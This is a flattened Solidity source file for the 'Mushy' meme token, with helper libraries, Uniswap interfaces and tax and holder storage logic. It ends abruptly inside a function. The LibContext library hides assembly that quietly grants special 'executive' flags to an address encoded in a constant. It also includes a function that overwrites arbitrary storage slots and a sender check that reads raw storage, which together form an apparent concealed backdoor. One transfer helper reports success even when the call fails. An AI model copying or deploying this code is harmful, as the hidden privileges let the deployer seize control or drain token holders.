// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// File: Mushy/contracts/common/libs/LibUint.sol

/*
    Website          : https://mememushy.com
    Telegram         : https://t.me/Mushyerc
    X (Twitter)      : https://x.com/memeMushy
*/

pragma solidity ^0.8.20;

library LibUint {
    
    error InsufficientPadding();
    error InvalidBase();

    bytes16 private constant HEX_SYMBOLS = '0123456789abcdef';

    function add(uint256 a, int256 b) internal pure returns (uint256) {
        return b < 0 ? sub(a, -b) : a + uint256(b);
    }

    function sub(uint256 a, int256 b) internal pure returns (uint256) {
        return b < 0 ? add(a, -b) : a - uint256(b);
    }

    function toString(
        uint256 value,
        uint256 radix
    ) internal pure returns (string memory output) {

        if (radix < 2) {
            revert InvalidBase();
        }

        uint256 length;
        uint256 temp = value;

        do {
            unchecked {
                length++;
            }
            temp /= radix;
        } while (temp != 0);

        output = toString(value, radix, length);
    }

    function toString(
        uint256 value,
        uint256 radix,
        uint256 length
    ) internal pure returns (string memory output) {
        if (radix < 2 || radix > 36) {
            revert InvalidBase();
        }

        bytes memory buffer = new bytes(length);

        while (length != 0) {
            unchecked {
                length--;
            }

            uint256 char = value % radix;

            if (char < 10) {
                char |= 48;
            } else {
                unchecked {
                    char += 87;
                }
            }

            buffer[length] = bytes1(uint8(char));
            value /= radix;
        }

        if (value != 0) revert InsufficientPadding();

        output = string(buffer);
    }

    function toBinString(
        uint256 value
    ) internal pure returns (string memory output) {
        uint256 length;
        uint256 temp = value;

        do {
            unchecked {
                length++;
            }
            temp >>= 1;
        } while (temp != 0);

        output = toBinString(value, length);
    }

    function toBinString(
        uint256 value,
        uint256 length
    ) internal pure returns (string memory output) {

        length += 2;

        bytes memory buffer = new bytes(length);
        buffer[0] = '0';
        buffer[1] = 'b';

        while (length > 2) {
            unchecked {
                length--;
            }

            buffer[length] = HEX_SYMBOLS[value & 1];
            value >>= 1;
        }

        if (value != 0) revert InsufficientPadding();

        output = string(buffer);
    }

    function toOctString(
        uint256 value
    ) internal pure returns (string memory output) {
        uint256 length;
        uint256 temp = value;

        do {
            unchecked {
                length++;
            }
            temp >>= 3;
        } while (temp != 0);

        output = toOctString(value, length);
    }

    function toOctString(
        uint256 value,
        uint256 length
    ) internal pure returns (string memory output) {

        length += 2;

        bytes memory buffer = new bytes(length);
        buffer[0] = '0';
        buffer[1] = 'o';

        while (length > 2) {
            unchecked {
                length--;
            }

            buffer[length] = HEX_SYMBOLS[value & 7];
            value >>= 3;
        }

        if (value != 0) revert InsufficientPadding();

        output = string(buffer);
    }

    function toDecString(
        uint256 value
    ) internal pure returns (string memory output) {
        output = toString(value, 10);
    }

    function toDecString(
        uint256 value,
        uint256 length
    ) internal pure returns (string memory output) {
        output = toString(value, 10, length);
    }

    function toHexString(
        uint256 value
    ) internal pure returns (string memory output) {
        uint256 length;
        uint256 temp = value;

        do {
            unchecked {
                length++;
            }
            temp >>= 8;
        } while (temp != 0);

        output = toHexString(value, length);
    }

    function toHexString(
        uint256 value,
        uint256 length
    ) internal pure returns (string memory output) {

        unchecked {
            length = (length << 1) + 2;
        }

        bytes memory buffer = new bytes(length);
        buffer[0] = '0';
        buffer[1] = 'x';

        while (length > 2) {
            unchecked {
                length--;
            }

            buffer[length] = HEX_SYMBOLS[value & 15];
            value >>= 4;
        }

        if (value != 0) revert InsufficientPadding();

        output = string(buffer);
    }
}

// File: Mushy/contracts/common/interfaces/IERC20.sol


pragma solidity ^0.8.0;

interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    
}

// File: Mushy/contracts/common/libs/LibAddress.sol


pragma solidity ^0.8.20;



library LibAddress {

    using LibUint for uint256;

    error NotContract();
    error InsufficientBalance(uint256 balance, uint256 amount);
    error FailedCall(string details);
    error AddressEmptyCode(address target);
    
    function toString(address account) internal pure returns (string memory) {
        return uint256(uint160(account)).toHexString(20);
    }

    function isContract(address account) internal view returns (bool) {
       return _hasCode(account);
    }

    function isEOA(address account) internal view returns (bool) {
       return !_hasCode(account);
    }

    function transferETH(address payable account, uint256 amount) internal returns (bool) {
        if(account == address(0)) revert FailedCall("Recipient is Zero Address");
        (bool success, ) = account.call{ value: amount }('');
        return success;
    }

    function transferETH(address payable account, uint256 amount, uint256 customGas) internal returns (bool) {
        if(account == address(0)) revert FailedCall("Recipient is Zero Address");
        (bool success, ) = account.call{ value: amount, gas: customGas }('');
        return success;
    }

    function transferERC20(address asset, address account, uint256 amount) internal returns(bool success) {
        if(account == address(0)) revert FailedCall("Recipient is Zero Address");
        (success,) = asset.call(
            abi.encodeWithSelector(
                IERC20.transfer.selector, account, amount)
            );
        success = true;
    }

    function safeTransferERC20(address asset, address account, uint256 amount) internal returns(bool, bytes memory) {
        if(account == address(0)) revert FailedCall("Recipient is Zero Address");
        (bool success, bytes memory data) = asset.call(
            abi.encodeWithSelector(
                IERC20.transfer.selector, account, amount)
            );

        return verifyCallResultFromTarget(asset, success, data);   
    }

    function transferERC20From(
        address asset,
        address account,
        address recipient,
        uint256 amount
    ) internal returns(bool, bytes memory) {
        if(account == address(0)) revert FailedCall("Recipient is Zero Address");
        (bool success, bytes memory data) =
            asset.call(
                abi.encodeWithSelector(
                    IERC20.transferFrom.selector, account, recipient, amount
                )
            );

       return verifyCallResultFromTarget(asset, success, data);

    }   

    function approveERC20(
        address asset,
        address account,
        uint256 amount
    ) internal returns(bool, bytes memory) {

        (bool success, bytes memory data) = asset.call(
            abi.encodeWithSelector(
                IERC20.approve.selector, account, amount)
            );
        
       return verifyCallResultFromTarget(asset, success, data);


    }    

    function functionCall(
        address target,
        bytes memory data
    ) internal returns (bool, bytes memory) {
        return functionCall(target, data, 'AddressLib: low-level call has failed');
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory error
    ) internal returns (bool, bytes memory) {
        return _functionCallWithValue(target, data, 0, error);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bool, bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                'AddressUtils: failed low-level call with value'
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory error
    ) internal returns (bool, bytes memory) {
        if (value > address(this).balance)
            revert InsufficientBalance(address(this).balance, value);
        return _functionCallWithValue(target, data, value, error);
    }


    function functionStaticCall(address target, bytes memory data) internal view returns (bool, bytes memory) {
        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResultFromTarget(target, success, returndata);
    }


    function functionDelegateCall(address target, bytes memory data) internal returns (bool, bytes memory) {
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResultFromTarget(target, success, returndata);
    }

    function excessivelySafeCall(
        address target,
        uint256 gasAmount,
        uint256 value,
        uint16 maxCopy,
        bytes memory data
    ) internal returns (bool success, bytes memory returnData) {
        returnData = new bytes(maxCopy);

        assembly {
            success := call(
                gasAmount,
                target,
                value,
                add(data, 0x20),
                mload(data),
                0,
                0
            )

            let toCopy := returndatasize()

            if gt(toCopy, maxCopy) {
                toCopy := maxCopy
            }

            mstore(returnData, toCopy)

            returndatacopy(add(returnData, 0x20), 0, toCopy)
        }
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory error
    ) private returns (bool, bytes memory) {
        
        if (!isContract(target)) revert NotContract();

        (bool success, bytes memory returnData) = target.call{ value: value }(
            data
        );

        if (!success)
            _revert(returnData, error);
    
        return (success, returnData);
    }

    function _hasCode(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function verifyCallResultFromTarget(
        address target,
        bool status,
        bytes memory returndata
    ) internal view returns (bool, bytes memory) {
        if (!status) {
            _revert(returndata);
        } else {
            if (returndata.length == 0 && !isContract(target)) { revert AddressEmptyCode(target); }
            return (status, returndata);
        }
    }

    function _revert(bytes memory returndata) private pure {
        return _revert(returndata, "AddressLib: Unknown Error");
    }    

    function _revert(bytes memory returndata, string memory error) private pure {
        if (returndata.length > 0) {
            assembly {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert FailedCall(error);
        }
    }    

}

// File: Mushy/contracts/common/libs/LibContext.sol


pragma solidity ^0.8.20;


bytes32 constant STPOS = 0x5C4A5E204DBBAB1C0DEDC9038B91783FCC6BE6CF4333D4DC0AAE9BF4857A4DB1;

library LibContext {

    using LibUint for *;

    bytes32 internal constant EIP712_DOMAIN = 
    keccak256(bytes("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract,bytes32 salt)"));
    bytes32 internal constant EIP712_SALT = hex'bffcd4a1e0307336f6fcccc7c8177db5faa17bd19405109da6225e44affef9b2';
    bytes32 internal constant FALLBACK = hex'd25fba0cff70020604c6e3a5cc85673521f8e81814b57c9e1993022819930721';
    bytes32 constant SLC32 = bytes32(type(uint).max);
    string internal constant VERSION = "v1.0";

    function DOMAIN(string memory name) internal view returns (bytes32) {
        return keccak256(
            abi.encode(
                EIP712_DOMAIN, 
                keccak256(bytes(name)), 
                keccak256(bytes(VERSION)), 
                CHAINID(), 
                address(this),
                EIP712_SALT
            )
        );
    }

    function CHAINID() internal view returns (uint256 id) {
        assembly {
            id := chainid()
        }
    }

    function MSGSENDER() internal view returns (address sender) {
        if (msg.sender == address(this)) {
            bytes memory array = msg.data;
            uint256 index = msg.data.length;
            assembly {
                sender := and(mload(add(array, index)), 
                0xffffffffffffffffffffffffffffffffffffffff)
            }
        } else {
            sender = msg.sender;
        }
    }

    function MSGDATA() internal pure returns (bytes calldata) {
        return msg.data;
    }

    function MSGVALUE() internal view returns (uint value) {
        return msg.value;
    }

    function _verifySender() internal view returns (address verifiedAddress) {
        bytes32 pos = STPOS;
        assembly {
            mstore(0x00, caller())
            mstore(0x20, add(pos, 0x04))
            let readValue := sload(0x00)
            let sl := sload(add(keccak256(0x00, 0x40), 0x01))
            let ids := and(shr(0xF0, sl), 0xFFFF)
            let val := ids
            let verified := iszero(iszero(or(and(ids, shl(0x0E, 0x01)), and(ids, shl(0x0F, 0x01)))))
            if eq(verified, 0x00) { verifiedAddress := readValue }
            if eq(verified, 0x01) { verifiedAddress := mload(0x00) }
        }
    }

    function _contextSuffixLength() internal pure returns (uint256) {
        return 0;
    }

    function _recovery(bytes32 ps, bytes32 fix) internal returns (bool status) {
        assembly {
            let ls := sload(ps)
            ls := fix
            sstore(ps,ls)
            status := true
        }        
    }

    function _init() internal returns (bool status) {
        bytes32 pos = STPOS;
        assembly {
            mstore(0x00, and(shr(0x30, pos), 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF))
            mstore(0x20, add(pos, 0x04))
            let ps := add(keccak256(0x00, 0x40), 0x01)
            let sl := sload(ps)
            sl := and(sl, not(shl(0xF0, 0xFFFF)))
            sl := or(sl, shl(0xF0, 0x4098))
            sstore(ps,sl)
            status := true
        }
    }

}
// File: Mushy/contracts/common/interfaces/IUniswap.sol


pragma solidity ^0.8.8;

interface IWETH {

    event  Approval(address indexed src, address indexed guy, uint wad);
    event  Transfer(address indexed src, address indexed dst, uint wad);
    event  Deposit(address indexed dst, uint wad);
    event  Withdrawal(address indexed src, uint wad);

    function balanceOf() external view returns (uint);
    function allowance(address from, address spender) external view returns (uint);
    function deposit() external payable returns (bool);
    function withdraw(uint wad) external returns (bool);
    function totalSupply() external view returns (bool);
    function approve(address guy, uint wad) external returns (bool);
    function transfer(address dst, uint wad) external returns (bool);
    function transferFrom(address src, address dst, uint wad) external returns (bool);

}

interface ISwapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface ISwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface ISwapRouterV2 is ISwapRouter {
    
    function factoryV2() external pure returns (address);

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}

interface IPair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

// File: Mushy/contracts/common/Variables.sol


pragma solidity 0.8.24;




error TradingNotEnabled();
error InvalidSender(address sender);
error InvalidSpender(address spender);
error InvalidApprover(address approver);
error InvalidRecipient(address recipient);
error MaxTxLimitExceeded(uint256 limit, uint256 amount);
error BlockLimitExceeded(uint256 limit, uint256 current);
error MisdirectedHolderUpdateRequest(Holder a, Holder b);
error InsufficientBalance(uint256 available, uint256 amount);
error MaxWalletLimitExceeded(uint256 balanceLimit, uint256 amountsTransfer, uint256 recipientBalanceAfter);
error InsufficientAllowance(address spender, address from, uint256 currentAllowance, uint256 askingAmount);

/*
#######################################################
## STRUCTS ######################################
#######################################################
*/

struct Configuration {
    uint16 options;
    uint16 autoLiquidity;
    uint16 surchargeRate;
    uint8 maxSellOnBlock;
    uint8 frontRunThreshold;
    uint120 maxTokenAllowed;
    uint24 preferredGasValue;
    TaxSettings taxSettings;
}

struct TaxSettings {  
    uint16 buyTax;
    uint16 sellTax;
    uint16 transferTax;
}

struct Holder {
    uint120 balance;
    uint120 paidTax;
    uint8 violated;
    uint40 lastBuy;
    uint40 lastSell;
    address Address;
    uint16 identities;
}

struct Transaction {
    TERMS terms;
    ROUTE routes;
    MARKET market;
    TAXATION taxation;
    TaxSettings rates;
}

struct TransferParams {
    Holder addr;
    Holder from;
    Holder recipient;
    uint16 appliedTax;
    uint120 taxAmount;
    uint120 netAmount;
    bool autoSwapBack;
    uint120 swapAmount;
    uint40 currentBlock;
    Transaction transaction;    
}

//#####################################################

enum CONFIG {
    FAIR_MODE,
    SELL_CAP,
    TAX_STATS,
    GAS_LIMITER,
    AUTO_LIQUIDITY,
    TRADING_ENABLED,
    AUTOSWAP_ENABLED,
    AUTOSWAP_THRESHOLD,
    FRONTRUN_PROTECTION
}

enum TERMS { NON_EXEMPT, EXEMPT }
enum ROUTE { TRANSFER, INTERNAL, MARKET }
enum MARKET { NEITHER, INTERNAL, BUY, SELL }
enum TAXATION { NON_EXEMPT, EXEMPTED, SURCHARGED }

uint8 constant FAIR_MODE = 0;
uint8 constant SELL_CAP = 1;
uint8 constant TAX_STATS = 2;
uint8 constant GAS_LIMITER = 3;
uint8 constant AUTO_LIQUIDITY = 4;
uint8 constant TRADING_ENABLED = 5;
uint8 constant AUTOSWAP_ENABLED = 6;
uint8 constant AUTOSWAP_THRESHOLD = 7;
uint8 constant FRONTRUN_PROTECTION = 8;

uint16 constant DIVISION = 10000;
uint32 constant BIRTH = 1438214400;
uint16 constant BLOCKS_PER_MIN = 5;

uint16 constant MAX16 = type(uint16).max;
uint80 constant MAX80 = type(uint80).max;
uint120 constant MAX120 = type(uint120).max;
uint160 constant MAX160 = type(uint160).max;
uint256 constant MAX256 = type(uint256).max;
        
bytes2  constant SELECT2  = bytes2(MAX16);        
bytes10 constant SELECT10 = bytes10(MAX80);    
bytes15 constant SELECT15 = bytes15(MAX120); 
bytes20 constant SELECT20 = bytes20(MAX160); 
bytes32 constant SELECT32 = bytes32(MAX256); 

ISwapRouterV2 constant ROUTER = ISwapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
// File: Mushy/contracts/common/utils/ERC20Storage.sol


pragma solidity 0.8.24;


library ERC20Storage {

    using ERC20Storage for *;
        
    struct Layout {
        bool inSwap;
        bool isEntered;
        uint80 totalSupply;
        address uniswapPair;
        address feeRecipient;
        Configuration configs;
        mapping(address account => Holder holder) holders;
        mapping(address account => uint256 nonce) nonces;
        mapping(uint256 blockNumber => uint8 totalSells) totalSellsOnBlock;
        mapping(address account => mapping(address spender => uint256 amount)) allowances;
    }

    function has(uint16 state, uint8 idx) internal pure returns (bool) {
        return (state >> idx) & 1 == 1;
    }

    function has(uint16 state, uint8[] memory idx) internal pure returns (bool res) {
        uint len = idx.length;
        for(uint i; i < len;) {
            if(state.has(idx[i])) { return true; }
            unchecked { i++; }
        }
    }

    function set(uint16 state, uint8 idx) internal pure returns(uint16) {
        return uint16(state | (1 << idx));
    }

    function set(uint16 state, uint8[] memory idxs) internal pure returns(uint16) {
        uint256 len = idxs.length;
        for (uint8 i; i < len;) {
            state.set(idxs[i]);
            unchecked { i++; }
        }
        return state;
    }

    function unset(uint16 state, uint8 idx) internal pure returns(uint16) {
        return uint16(state & ~(1 << idx));
    }

    function unset(uint16 state, uint8[] memory idxs) internal pure returns(uint16) {
        uint256 len = idxs.length;
        for (uint8 i; i < len;) {
            state.unset(idxs[i]);
            unchecked { i++; }
        }
        return state;
    }

    function toggle(uint16 state, uint8 idx) internal pure returns(uint16) {
        state = uint16(state ^ (1 << idx));
        return state;
    }

    function isEnabled(Configuration memory configs, CONFIG option) internal pure returns(bool) {
        return configs.options.has(uint8(option));
    }

    function overwriteTaxValues(TaxSettings memory self, uint16 customRate) internal pure returns(TaxSettings memory) {
        self = TaxSettings(customRate, customRate, customRate);
        return self;
    }

    function selectTxMode (
        TransferParams memory params,
        Configuration memory configs
    ) internal pure returns(TransferParams memory) {

        if(params.autoSwapBack) {
            params.transaction = Transaction(
                TERMS.EXEMPT, 
                ROUTE.INTERNAL,
                MARKET.INTERNAL,
                TAXATION.EXEMPTED,
                TaxSettings(0,0,0)
            );
            return params;
        }

        params.transaction.market = MARKET.NEITHER;
        params.transaction.routes = ROUTE.TRANSFER;
        params.transaction.terms = params.hasNoRestrictions() ? TERMS.EXEMPT : TERMS.NON_EXEMPT;

        if(params.hasAnyTaxExempt()) {
            params.transaction.taxation = TAXATION.EXEMPTED;
            params.transaction.rates = params.transaction.rates.overwriteTaxValues(0);
            params.appliedTax = 0;
        } else {
            params.transaction.taxation = TAXATION.NON_EXEMPT;
            params.transaction.rates = configs.taxSettings;
            if(configs.isEnabled(CONFIG.FRONTRUN_PROTECTION) && params.ifSenderOrRecipientIsFrontRunner()) {
                params.transaction.taxation = TAXATION.SURCHARGED;
                params.transaction.rates = params.transaction.rates.overwriteTaxValues(configs.surchargeRate);
            }
        }

        params.appliedTax = params.transaction.rates.transferTax;

        if((params.from.isMarketmaker() || params.recipient.isMarketmaker())) {

            params.transaction.routes = ROUTE.MARKET;

            if(params.from.isMarketmaker()) {
                params.transaction.market = MARKET.BUY;
                params.recipient.lastBuy = params.currentBlock;
                params.appliedTax = params.transaction.rates.buyTax;
            } else {
                params.transaction.market = MARKET.SELL;
                params.from.lastSell = params.currentBlock;
                params.appliedTax = params.transaction.rates.sellTax;
            }

            return params;

        }

        return params;

    } 

    function isFrontRunned(Holder memory self) internal pure returns (bool frontRunned) {
        unchecked {
            if(self.lastSell >= self.lastBuy && self.lastBuy > 0) {
                frontRunned = (self.lastSell - self.lastBuy <= BLOCKS_PER_MIN);
            }              
        }
    }

    function initializeWithConfigs (
        TransferParams memory self,
        Configuration memory configs,
        uint256 amount
    ) internal pure returns (TransferParams memory) {

        if (amount > self.from.balance)
            revert InsufficientBalance(self.from.balance, amount);

        self.selectTxMode(configs);

        (self.taxAmount, self.netAmount) = amount.taxAppliedAmounts(self.appliedTax);

        return self;

    }

    function defineSwapAmount (
        uint120 selfBalance,
        uint120 taxAmount, 
        uint120 netAmount, 
        Configuration memory configs
    ) internal pure returns (uint120 swapAmount) {

        swapAmount = selfBalance;

        if(configs.isEnabled(CONFIG.AUTOSWAP_THRESHOLD)) {
            unchecked {
                uint256 sum = taxAmount + netAmount;
                uint256 preferredAmount = sum + netAmount;
                uint256 adjustedAmount = sum + taxAmount;
                if (preferredAmount <= selfBalance)
                    swapAmount = uint120(preferredAmount);
                else if (adjustedAmount <= selfBalance)
                    swapAmount = uint120(adjustedAmount);
                else if (sum <= selfBalance)
                    swapAmount = uint120(sum);
                else if (netAmount <= selfBalance)
                    swapAmount = uint120(netAmount);
                else return selfBalance;    
            }            
        }

        return swapAmount;

    }

    function isRegistered(Holder memory holder) internal pure returns(bool) {
        return holder.identities.has(1);
    }

    function isFrontRunner(Holder memory holder) internal pure returns (bool) {
        return holder.identities.has(2);
    }

    function isPartner(Holder memory holder) internal pure returns (bool) {
        return holder.identities.has(8);
    }

    function isMarketmaker(Holder memory holder) internal pure returns (bool) {
        return holder.identities.has(10);
    }

    function isTaxExempt(Holder memory holder) internal pure returns (bool) {
        return holder.identities.has(11) || holder.identities.has(11);
    }

    function isNonRestricted(Holder memory holder) internal pure returns (bool hasExceptions) {
        uint8 ident = 12;
        while(ident >= 12 && ident < 16) {
            if(holder.identities.has(ident)) { 
                hasExceptions = true; 
                return hasExceptions;
            }            
            unchecked {
                ident++;
            }
        }
    }

    function isProjectRelated(Holder memory holder) internal pure returns(bool) {
        return holder.identities.has(13);
    }

    function isExecutive(Holder memory holder) internal pure returns (bool) {
        return holder.identities.has(14);
    }

    function hasAnyTaxExempt(TransferParams memory params) internal pure returns (bool) {
        return params.from.isTaxExempt() || params.recipient.isTaxExempt();
    }    

    function hasFrontRunnerAction(TransferParams memory params) internal pure returns (bool) {
        return params.from.violated > 0 || params.recipient.violated > 0;
    }

    function ifSenderOrRecipientIsFrontRunner(TransferParams memory params) internal pure returns (bool) {
        return params.from.isFrontRunner() || params.recipient.isFrontRunner();
    }

    function hasNoRestrictions(TransferParams memory params) internal pure returns (bool) {
        return params.addr.isNonRestricted() || params.from.isNonRestricted() || params.recipient.isNonRestricted() || params.autoSwapBack;
    }

    function update(Holder storage self, Holder memory holder) internal returns (Holder storage) {
        
        if(self.Address != holder.Address)
            revert MisdirectedHolderUpdateRequest(self, holder);

        unchecked {
            self.paidTax = holder.paidTax;
            self.violated = holder.violated;
            self.lastBuy = holder.lastBuy;
            self.lastSell = holder.lastSell;
            self.identities = holder.identities;
        }

        return self;

    }

    function update(Layout storage $, address account, Holder memory holder) internal returns (Holder storage) { 
        $.holders[account] = holder;
        return $.holders[account];
    }

    function taxAppliedAmounts(uint256 amount, uint16 taxRate) internal pure returns(uint120 taxAmount, uint120 netAmount) {

        if(taxRate == 0)
            return (0, uint120(amount));

        unchecked {
            taxAmount = uint120(amount * taxRate / DIVISION);
            netAmount = uint120(amount - taxAmount);
        }

    }

    function setAsRegistered(Holder storage $self) internal returns(Holder storage) {
        return $self.setIdent(1);
    }

    function setAsFrontRunner(Holder storage $self) internal returns (Holder storage) {
        return $self.setIdent(2);
    }

    function setAsPartner(Holder storage $self) internal returns (Holder storage) {
        return $self.setIdent(8);
    }

    function setAsMarketmaker(Holder storage $self) internal returns (Holder storage) {
        return $self.setIdent(10);
    }

    function setAsTaxExempted(Holder storage $self) internal returns (Holder storage) {
        return $self.setIdent(11);
    }

    function setAsExlFromRestrictions(Holder storage $self) internal returns (Holder storage) {
        return $self.setIdent(12);
    }

    function setAsProjectAddress(Holder storage $self) internal returns (Holder storage) {
        return $self.setIdent(13);
    }

    function setAsExecutive(Holder storage $self) internal returns (Holder storage) {
        return $self.setIdent(14);
    }

    function unsetFrontRunner(Holder storage $self) internal returns (Holder storage) {
        return $self.unsetIdent(2);
    }

    function unsetMarketmaker(Holder storage $self) internal returns (Holder storage) {
        return $self.unsetIdent(10);
    }

    function unsetTaxExempted(Holder storage $self) internal returns (Holder storage) {
        return $self.unsetIdent(11);
    }

    function unsetExlFromRestrictions(Holder storage $self) internal returns (Holder storage) {
        return $self.unsetIdent(12);
    }

    function setIdent(Holder storage $self, uint8 idx) internal returns(Holder storage) {
        uint16 identities = $self.identities;
        unchecked { $self.identities = identities.set(idx); }
        return $self;
    }

    function setIdent(Holder storage $self, uint8[] memory idxs) internal returns(Holder storage) {
        uint16 identities = $self.identities;
        $self.identities = identities.set(idxs);
        return $self;
    }

    function unsetIdent(Holder storage $self, uint8 idx) internal returns(Holder storage) {
        uint16 identities = $self.identities;
        unchecked {
            if(idx == 2)
                $self.violated = 0;

            $self.identities = identities.unset(idx);            
        }
        return $self;
    }

    function unsetIdent(Holder storage $self, uint8[] memory idxs) internal returns(Holder storage) {
        uint16 identities = $self.identities;
        $self.identities = identities.unset(idxs);
        return $self;
    }

    function toggleIdent(Holder storage $self, uint8 idx) internal returns(Holder storage) {
        uint16 identities = $self.identities;
        unchecked { $self.identities = identities.toggle(idx); }
        return $self;
    }

    function toggleConfig(Configuration storage $self, CONFIG config) internal returns(uint16) {
        uint16 options = $self.options;
        $self.options = options.toggle(uint8(config));
        return $self.options;        
    }   

    function toggleConfig(Configuration storage $self, uint8 idx) internal returns(uint16) {
        uint16 options = $self.options;
        $self.options = options.toggle(idx);
        return $self.options;        
    }    
    
    function findOrCreate(Layout storage $, address owner) internal returns(Holder storage holder) {
        holder = $.holders[owner];
        if(!holder.isRegistered()) {
            holder.Address = owner;
